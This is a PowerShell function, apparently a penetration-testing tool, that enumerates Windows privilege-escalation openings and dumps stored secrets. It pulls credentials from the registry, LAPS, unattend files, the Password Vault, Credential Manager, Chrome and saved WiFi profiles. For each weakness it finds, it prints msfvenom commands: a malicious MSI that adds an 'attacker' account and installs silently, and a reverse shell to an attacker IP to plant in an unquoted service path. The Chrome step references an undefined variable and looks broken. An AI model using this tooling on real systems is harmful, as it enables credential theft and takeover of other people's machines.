Function Test-PrivEsc {
<#
.SYNOPSIS
This cmdlet is meant to check whether the AlwaysInstallEleveated permissions are enabled on a Windows Machine  which opens the door to privesc. It checks common registry locations for clear text credentials. It checks for weak service permissions. This checks for WSUS using HTTP to download updates which can be exploited for privilege escalation. This checks whether the fodhelper bypass method is available for admin users. This checks for unquoted service paths in the reigstry as well.


.DESCRIPTION
AlwaysInstallElevated is functionality that offers all users(especially the low privileged user) on a windows machine to run any MSI file with elevated privileges. MSI is a Microsoft based installer package file format which is used for installing, storing and removing of a program. When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).


.EXAMPLE
Test-PrivEsc -Verbose
# This example performs a check for common privilege escalation methods.


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
None


.OUTPUTS
None
#>
    [CmdletBinding()]
        param()

#==============================================================================================================
#  CLEAR TEXT CREDENTIALS
#==============================================================================================================
        Write-Output -InputObject "Searching Registry for clear text credentials..."
        Get-ItemProperty -Path "HKCU:\Software\ORL\WinVNC3\Password" -ErrorAction "SilentlyContinue"

        $AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
        If (($AutoLoginPassword).DefaultPassword) {

            Write-Output -InputObject "Auto Login Credentials Found: "
            Write-Output -InputObject "$AutoLoginPassword"

        }  # End If

        Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP" -ErrorAction "SilentlyContinue"
        Get-ItemProperty -Path "HKCU:\Software\TightVNC\Server" -ErrorAction "SilentlyContinue"
        Get-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions" -ErrorAction "SilentlyContinue"
        Get-ItemProperty -Path "HKCU:\Software\OpenSSH\Agent\Key" -ErrorAction "SilentlyContinue"

        Write-Verbose -Message "Searching for LAPS password (Requires admin permissions to obtain)"
        $Domain = New-Object -TypeName "System.DirectoryServices.DirectoryEntry"
        $Search = New-Object -TypeName "System.DirectoryServices.DirectorySearcher"
        $Search.SearchRoot = $Domain
        $Search.Filter = "(primaryGroupID=516)"
        $Search.SearchScope = "Subtree"
        $Result = $Search.FindAll()
        $Object = $Result.GetDirectoryEntry()
        $Object | Select-Object -Property 'Name','ms-Mcs-AdmPwd'

        $PassFiles = "C:\Windows\sysprep\sysprep.xml","C:\Windows\sysprep\sysprep.inf","C:\Windows\sysprep.inf","C:\Windows\Panther\Unattended.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\Panther\Unattend\Unattended.xml","C:\Windows\System32\Sysprep\unattend.xml","C:\Windows\System32\Sysprep\unattended.xml","C:\unattend.txt","C:\unattend.inf"
        ForEach ($PassFile in $PassFiles) {

            If (Test-Path -Path $PassFile) {

                Get-Content -Path $PassFile | Select-String -Pattern "Password"

            }  # End If

        }  # End ForEach

        Write-Verbose -Message "Checking for passwords in the Windows Password vault"
        [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }

        Write-Verbose -Message "Checking Credential Manager for stored credentials"
        Install-Module -Name CredentialManager -Force
        Import-Module -Name CredentialManager -Force
        Get-StoredCredential | ForEach-Object { Write-Host -NoNewLine $_.Username; Write-Host -NoNewLine ":" ; $P = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.Password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($P); }

        Write-Verbose -Message "Dumping passwords from Google Chrome"
        [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))

        Write-Verbose -Message "Dumping WiFi passwords"
        (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
#============================================================================================================
#  AlwaysInstallElevated PRIVESC
#============================================================================================================
        Write-Output -InputObject "Checking for AlwaysInstallElevated PrivEsc method..."
        If ((Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction "SilentlyContinue" | Select-Object -Property "AlwaysInstallElevated") -eq 1) {

            Write-Output -InputObject "Target is vulnerable. To exploit this vulnerability you can use: exploit/windows/local/always_install_elevated`n
                        Use the below commands to create a payload for privilege escalation.`n"
            Write-Output -InputObject "msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi-nouac -o alwe.msi    # No uac format`n
                        msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi -o alwe.msi          # Using the msiexec the uac wont be prompted`n
                        msiexec /quiet /qn /i C:\Users\<username>\Downloads\alwe.msi                            # Execute the installation of the malicious msi file in the background
                        "

        } Else {

            Write-Verbose -Message "Target is not vulnerable to AlwaysInstallElevated PrivEsc method"

        }  # End If Else
        
        If ((Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction "SilentlyContinue" | Select-Object -Property "AlwaysInstallElevated") -eq 1) {

            Write-Output -InputObject "Target is vulnerable. To exploit this vulnerability you can use: exploit/windows/local/always_install_elevated`n
                        Use the below commands to create a payload for privilege escalation.`n"
            Write-Output -InputObjet "msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi-nouac -o privesc.msi  # No uac format`n
                        msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi -o privesc.msi        # Using the msiexec the uac wont be prompted`n
                        msiexec /quiet /qn /i C:\Users\<username>\Downloads\privesc.msi                             # Execute the installation of the malicious msi file in the background
                        "

        } Else {

            Write-Verbose -Message "Target is not vulnerable to AlwaysInstallElevated PrivEsc method"

        }  # End If Else

#===========================================================================================================
#  WSUS PRIVESC
#===========================================================================================================
        Write-Output -InputObject "Checking for WSUS updates allowed over HTTP for PrivEsc..."
        If (((Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "UseWUServer" -ErrorAction "SilentlyContinue") -eq 1) -and (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "WUServer" -ErrorAction "SilentlyContinue" -Contains "http://")) {

            Write-Output -InputObject "Target is vulnerable to HTTP WSUS updates.`n EXPLOIT: https://github.com/pimps/wsuxploit"

        } Else {

            Write-Verbose -Message "Target is not vulnerable to WSUS using HTTP."

        }  # End If Else


#============================================================================================================
#  UNQUOTED SERVICE PATHS
#============================================================================================================
        Write-Output -InputObject "Searching for unquoted service paths..."

        $UnquotedServicePaths = Get-CimInstance -ClassName "Win32_Service" -Property "Name","DisplayName","PathName","StartMode" | Where-Object -FilterScript { $_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*' } | Select-Object -Property "PathName","DisplayName","Name"
        If ($UnquotedServicePaths) {

            Write-Output -InputObject "Unquoted Service Path has been found"
            $UnquotedServicePaths | Select-Object -Property PathName,DisplayName,Name | Format-List -GroupBy Name

            Write-Output -InputObject "Create a reverse shell using the following command`n`nmsfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=1337 -f exe -o msf.exe"
            Write-Output -InputObject "Place the generated payload msf.exe into the unquoted service path location and restart the service."

        } Else {

            Write-Verbose -Message "Target does not contain any unquoted service paths. "

        }  # End If Else

#==============================================================================================================
#  WEAK WRITE PERMISSIONS
#==============================================================================================================
        Write-Output -InputObject "Performing search for files with weak permissions that may execute as admin or system..."

        Get-ChildItem -Path 'C:\Program Files\*','C:\Program Files (x86)\*' | ForEach-Object { Try { Get-Acl -Path $_ -ErrorAction "SilentlyContinue" | Where-Object -FilterScript {($_.Access | Select-Object -ExpandProperty "IdentityReference") -Match "Everyone"} } Catch {$Error[0]}}
        Get-ChildItem -Path 'C:\Program Files\*','C:\Program Files (x86)\*' | ForEach-Object { Try { Get-Acl -Path $_ -ErrorAction "SilentlyContinue" | Where-Object -FilterScript {($_.Access | Select-Object -ExpandProperty "IdentityReference") -Match "BUILTIN\\Users"} } Catch {$Error[0]}}

#===============================================================================================================
# CHECK FOR FODHELPER UAC BYPASS
#===============================================================================================================
        $Value = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -Property "ConsentPromptBehaviorAdmin"
        
        Switch ($Value.ConsentPromptBehaviorAdmin) {
        
            0 { $Message = "0 : Elevate without prompting" }
            1 { $Message = "1 : Prompt for credentials on the secure desktop" }
            2 { $Message = "2 : Prompt for consent on the secure desktop" }
            3 { $Message = "3 : Prompt for credentials"}
            4 { $Message = "4 : Prompt for consent"}
            5 { $Message = "5 : Prompt for consent for non-Windows binaries"}
            
        }  # End Switch

        If (($Value.ConsentPromptBehaviorAdmin -eq 1) -or ($Value.ConsentPromptBehaviorAdmin -eq 2)) {

            Write-Output -InputObject "This device is not vulnerable to the fodhelper UAC bypass method. `nUAC Settings: $Message"

        } Else {

            Write-Output -InputObject "This device is vulnerable to the fodhelper bypass method. `nCurrent UAC Settings: $Message"

        }  # End If Else

}  # End Function Test-PrivEsc
